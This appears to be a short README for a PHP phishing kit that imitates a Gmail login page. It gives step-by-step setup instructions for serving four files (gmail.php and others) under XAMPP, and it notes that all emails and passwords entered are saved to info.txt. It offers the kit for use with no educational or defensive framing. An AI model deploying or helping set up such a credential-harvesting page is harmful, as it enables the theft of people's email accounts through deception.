How to use?
Step1: Create a newfolder in Xampp-->htdocs.
Step2: Copy all the four files(gmail.php,gmail2.php,
message.php,result.php) into Xampp-->htdocs-->newfolder.
Step3: Goto GoogleChrome/Mozilla and open as:
localhost/newfolder/gmail.php
Step4 : Enjoy :)

Note: All emails and passwords gets automatically stored 
into info.txt file.
